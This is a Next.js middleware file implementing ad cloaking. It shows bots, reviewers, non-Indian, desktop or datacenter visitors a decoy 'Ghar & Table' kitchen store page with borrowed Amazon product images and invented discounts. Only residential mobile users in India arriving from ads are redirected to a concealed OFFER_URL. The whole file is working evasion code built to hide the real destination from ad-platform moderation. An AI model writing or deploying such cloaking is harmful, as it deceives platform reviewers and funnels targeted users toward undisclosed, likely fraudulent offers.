// src/middleware.ts
import { NextRequest, NextResponse } from 'next/server';
import { detectUserAgent, isMobile, hasAdIntent } from './lib/detection';
import { getIpAddress, analyzeIp } from './lib/ip-analyzer';

const OFFER_URL = process.env.OFFER_URL || 'https://example.com';

// --- CLOAKED PAGE HTML (Modern Kitchen Store) ---
const getCloakedHTML = (reasons: string[]) => {
  const logHtml = reasons.map(line => {
    const isPass = line.includes('✅');
    const color = isPass ? '#059669' : '#DC2626';
    return `<div class="status-line" style="color:${color}"><span class="label">${line}</span></div>`;
  }).join('');

  return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kitchen Essentials Store</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #111; --accent: #ff9f43; --bg: #f9f9f9; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); margin: 0; color: var(--primary); }
        a { text-decoration: none; color: inherit; }
        
        /* Header */
        header { background: #fff; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
        .logo { font-weight: 800; font-size: 20px; letter-spacing: -0.5px; }
        .nav-items { display: flex; gap: 20px; font-size: 14px; font-weight: 500; }
        .btn-primary { background: #bf5e26; color: white; padding: 10px 18px; border-radius: 4px; font-weight: 600; font-size: 13px; }
        
        /* Hero */
        .hero { background: #e5e5e5; padding: 60px 20px; text-align: center; background-image: url('https://images.unsplash.com/photo-1556910103-1c02745a30bf?auto=format&fit=crop&w=1600&q=80'); background-size: cover; background-position: center; position: relative; min-height: 300px; display: flex; align-items: center; justify-content: center;}
        .hero-overlay { background: rgba(255,255,255,0.9); padding: 30px; border-radius: 8px; max-width: 500px; margin: 0 auto; box-shadow: 0 10px 20px rgba(0,0,0,0.1); }
        .hero h1 { font-size: 2.5rem; line-height: 1.1; margin: 0 0 10px 0; color: #111; }
        .hero span { color: #bf5e26; font-style: italic; font-family: serif; }
        .hero p { font-size: 16px; color: #444; line-height: 1.5; margin-bottom: 20px; }
        .btn-hero { background: #111; color: #fff; padding: 12px 30px; border-radius: 4px; display: inline-block; font-weight: 500; }

        /* Products */
        .container { max-width: 1100px; margin: 40px auto; padding: 0 20px; }
        .section-title { font-size: 24px; font-weight: 700; margin-bottom: 25px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 25px; }
        
        /* Card */
        .card { background: #fff; border: 1px solid #eee; border-radius: 6px; overflow: hidden; transition: transform 0.2s; padding-bottom: 15px; }
        .card:hover { transform: translateY(-3px); box-shadow: 0 5px 15px rgba(0,0,0,0.08); }
        .sale-tag { background: #bf5e26; color: white; font-size: 10px; font-weight: bold; padding: 3px 6px; position: absolute; margin: 10px; border-radius: 2px; }
        .img-box { height: 200px; background: #f4f4f4; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; overflow: hidden; position: relative; }
        .img-box img { max-width: 90%; max-height: 90%; object-fit: contain; }
        .category { font-size: 10px; color: #999; text-transform: uppercase; letter-spacing: 1px; }
        .title { font-size: 14px; line-height: 1.4; margin: 5px 0; font-weight: 500; color: #111; }
        .rating { color: #ffc107; font-size: 12px; margin-bottom: 8px; display: flex; align-items: center; gap: 5px; }
        .rating span { color: #999; font-size: 11px; font-weight: normal; }
        
        /* Price Row */
        .price-row { display: flex; align-items: baseline; gap: 10px; margin: 10px 0; }
        .final-price { font-size: 18px; font-weight: 700; color: #222; }
        .old-price { text-decoration: line-through; color: #999; font-size: 14px; }
        .discount { color: #2ecc71; font-weight: 600; font-size: 12px; }
        
        /* Debug Log */
        .debug-box { background: #f1f1f1; padding: 10px; margin: 20px auto; max-width: 1000px; font-family: monospace; font-size: 12px; border: 1px solid #ddd; }
        
        /* Footer */
        footer { border-top: 1px solid #eee; margin-top: 50px; padding: 30px 20px; text-align: center; font-size: 12px; color: #777; background: #fff; }
        
        @media (max-width: 768px) {
            .nav-items { display: none; }
            .hero h1 { font-size: 1.8rem; }
            .grid { grid-template-columns: repeat(2, 1fr); gap: 15px; }
            .img-box { height: 140px; }
            .title { font-size: 12px; }
        }
        @media (max-width: 480px) {
            .grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>

<header>
    <div class="logo">GHAR & TABLE</div>
    <nav class="nav-items">
        <a href="#">Shop</a>
        <a href="#">Our Promise</a>
        <a href="#">Contact</a>
    </nav>
    <a href="#" class="btn-primary">Shop Collection</a>
</header>

<div class="hero-overlay">
    <h1>Better tools for <br> a better <span>kitchen.</span></h1>
    <p>Cook a little, gather a lot. Discover useful cookware, trusted appliances.</p>
    <a href="#" class="btn-hero">Browse Products</a>
</div>

<div class="container">
    <div class="section-title">Best Sellers</div>
    
    <div class="grid">
        <!-- Product 1: Pressure Cooker -->
        <div class="card">
            <div class="img-box">
                <div class="sale-tag">30% OFF</div>
                <img src="https://m.media-amazon.com/images/I/713Kl1I0CyL._SL1500_.jpg" alt="Induction Cooker">
            </div>
            <div style="padding: 0 15px;">
                <div class="category">KITCHEN ESSENTIALS</div>
                <div class="title">Prestige 5 Litres Pressure Handi, Induction Base Inner Lid</div>
                <div class="rating">★★★★★ <span>(459 reviews)</span></div>
                <div class="price-row">
                    <span class="final-price">₹4,299</span>
                    <span class="old-price">₹6,299</span>
                    <span class="discount">31% OFF</span>
                </div>
                <a href="tel:18001234" style="color:#bf5e26; font-size: 13px; font-weight: 600;">Enquire Now &rarr;</a>
            </div>
        </div>

        <!-- Product 2: Microwave -->
        <div class="card">
            <div class="img-box">
                <div class="sale-tag">HOT</div>
                <img src="https://m.media-amazon.com/images/I/51ZykaL8q6L._SL1200_.jpg" alt="Microwave">
            </div>
            <div style="padding: 0 15px;">
                <div class="category">APPLIANCES</div>
                <div class="title">LG 28 L Convection Microwave Oven (Silver) with Steam Cooking</div>
                <div class="rating">★★★★★ <span>(120 reviews)</span></div>
                <div class="price-row">
                    <span class="final-price">₹10,990</span>
                    <span class="old-price">₹13,490</span>
                    <span class="discount">18% OFF</span>
                </div>
                <a href="tel:18001234" style="color:#bf5e26; font-size: 13px; font-weight: 600;">Enquire Now &rarr;</a>
            </div>
        </div>

        <!-- Product 3: Grinder -->
        <div class="card">
            <div class="img-box">
                <div class="sale-tag">SALE</div>
                <img src="https://m.media-amazon.com/images/I/71qaGnOxACL._SX679_.jpg" alt="Mixer Grinder">
            </div>
            <div style="padding: 0 15px;">
                <div class="category">ELECTRONICS</div>
                <div class="title">Inalsa Iris 750 W Mixer Grinder, With 3 Stainless Steel Jars</div>
                <div class="rating">★★★★☆ <span>(85 reviews)</span></div>
                <div class="price-row">
                    <span class="final-price">₹3,450</span>
                    <span class="old-price">₹3,899</span>
                    <span class="discount">11% OFF</span>
                </div>
                <a href="tel:18001234" style="color:#bf5e26; font-size: 13px; font-weight: 600;">Enquire Now &rarr;</a>
            </div>
        </div>

        <!-- Product 4: Grill -->
        <div class="card">
            <div class="img-box">
                <div class="sale-tag">BESTSELLER</div>
                <img src="https://m.media-amazon.com/images/I/919+cmD3MsL._AC_SL1500_.jpg" alt="Sandwich Maker">
            </div>
            <div style="padding: 0 15px;">
                <div class="category">BREAKFAST</div>
                <div class="title">Prestige Panini Press Sandwich Maker, Non-Stick Coated Plates</div>
                <div class="rating">★★★★★ <span>(340 reviews)</span></div>
                <div class="price-row">
                    <span class="final-price">₹2,899</span>
                    <span class="old-price">₹3,299</span>
                    <span class="discount">12% OFF</span>
                </div>
                <a href="tel:18001234" style="color:#bf5e26; font-size: 13px; font-weight: 600;">Enquire Now &rarr;</a>
            </div>
        </div>
    </div>

  

</div>

<footer>
    <p>&copy; 2024 Ghar & Table. Thoughtful essentials for everyday kitchens.</p>
    <div style="margin-top: 10px;">
        <a href="#">Privacy Policy</a> | <a href="#">Terms & Conditions</a> | <a href="#">Shipping Policy</a>
    </div>
</footer>

</body>
</html>
`;
};

export async function middleware(request: NextRequest) {
  const ip = getIpAddress(request);
  const ua = request.headers.get('user-agent') || '';
  
  // 1. Bot Check
  const bot = detectUserAgent(ua);
  if (bot.isBot) {
    return new Response(getCloakedHTML([`Bot Detected: ${bot.reason} (Showing Cloak)`]), {
      status: 200, headers: { 'Content-Type': 'text/html; charset=UTF-8' }
    });
  }

  // 2. IP Analysis
  const { isResidential, countryCode } = await analyzeIp(ip);

  // 3. Target Logic
  const isUserMobile = isMobile(ua);
  const isAdClick = hasAdIntent(request);
  const isIndia = countryCode === 'IN';

  const logs = [
    `Country: ${countryCode} ${isIndia ? '✅' : '❌'}`,
    `Residential IP: ${isResidential} ${isResidential ? '✅' : '❌'}`,
    `Mobile Device: ${isUserMobile} ${isUserMobile ? '✅' : '❌'}`,
    `Ad Link: ${isAdClick} ${isAdClick ? '✅' : '❌'}`
  ];

  // Final Logic
  if (isResidential && isUserMobile && isAdClick && isIndia) {
    return NextResponse.redirect(new URL(OFFER_URL, request.url));
  }

  return new Response(getCloakedHTML(logs), {
    status: 200, headers: { 'Content-Type': 'text/html; charset=UTF-8' }
  });
}

export const config = { matcher: ['/'] };
